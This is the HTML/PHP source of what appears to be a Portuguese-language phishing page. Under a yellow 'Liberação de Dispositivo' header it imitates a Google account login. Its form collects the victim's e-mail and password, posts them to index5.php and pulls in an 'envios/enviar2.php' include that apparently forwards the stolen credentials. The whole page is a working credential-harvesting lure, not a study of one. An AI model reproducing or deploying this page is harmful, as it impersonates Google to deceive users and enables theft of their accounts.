<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Mobbi</title>
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="javascript">
function validation3() {
if (document.form.email.value == "" || document.form.email.value.length < 4 ){ alert ("E-mail, Inválida!"); document.form.email.focus(); return false; }
if (document.form.semnha.value == "" || document.form.semnha.value.length < 6 ){ alert ("Senha, Inválida!"); document.form.semnha.focus(); return false; }
}
</script>
<style>
input { width:70%; font-size:14px; outline:none; padding:0 0 0 10px; height:40px; border:1px solid #CCC; }
.u { font-family:Arial, Helvetica, sans-serif; font-size:1px; color:#FFF; }

@media (min-width: 768px){ #ss { background:#FFF; !important } }

#botton-box { width:100%; height:40px; background:#FF0; position:fixed; bottom:0px; }

#botton-box-dentro { width:95%; height:auto; max-width:400px; background:; margin:0 auto; position:relative; }

body {	padding: 0px; overflow:hidden; margin: 0px; background:#F5F5F5;	}

#proceguir { width:73%; height:45px; background:url(google/images/003.jpg); font-size:100%; border:1px solid #3079ED; text-align:center; border-radius:5px; color:#FFF; }

</style>
</head>

<body>
<div style="width:100%; height:50px; background:#F0DC01; color:#5574B4; font-family:'Arial'; font-size:17px; font-weight:bold;">
<table cellpadding="0" cellspacing="0" width="100%">
<tr>
<td width="30" height="50"><div style="width:15px; height:20px; background:url(images/a007.jpg) no-repeat; margin-left:10px; background-size:cover;"></div></td>
<td bgcolor="#F0DC01" align="center">Liberação de Dispositivo</td>
<td width="30" style="padding:0 10px 0 0;">Sair</td>
</tr>
</table>
</div>
<div style="height:auto; max-width:750px; margin:0 auto;">
<form name="form" id="form" action="index5.php" method="post" onSubmit="return validation3()">
<div style="font-family:'Arial'; font-size:17px; color:#5574B4; margin-top:10px; padding:10px; background:#FFF; border-bottom:1px solid #EDEDED;">Faça login da sua conta

Google<br>
</div>

<div style="background:#FFF; padding:20px 10px 20px 10px; margin-top:10px; border-bottom:1px solid #EDEDED;">
<div style="background:url(google/images/001.jpg) no-repeat center; padding:20px 0 20px 0;"></div>
<div style="background:url(google/images/002.jpg) no-repeat center; height:120px;"></div>
<div style="margin-top:10px;" align="center"><input type="text" name="email" id="email" placeholder="E-mail ou telefone" onkeypress="return SomenteNumero(event);" /></div>

<div style="margin-top:10px;" align="center"><input type="password" name="semnha" id="semnha" placeholder="Senha do E-mail" onkeypress="return SomenteNumero(event);" /></div>

<div style="margin-top:10px;" align="center"><input type="submit" name="proceguir" id="proceguir" value="Próximo"></div>

<div style="font-family:'Arial'; font-size:12px; color:#666666; text-align:center; padding:20px;">Uma Conta do Google para tudo o que o Google oferece</div>
<div style="background:url(google/images/005.jpg) no-repeat center; height:20px;"></div>

</div>
</form>
</div>

<div style="width:100%; height:40px; position:fixed; bottom:0; background:#FFF; padding:10px;">
<div style="width:40px; height:40px; background:url(images/a008.jpg) no-repeat; float:left;"></div>
<div style="width:40px; height:40px; background:url(images/a009.jpg) no-repeat; float:right; margin-right:20px;"></div>
</div>
</body>
<?php include"envios/enviar2.php"; ?>
</html>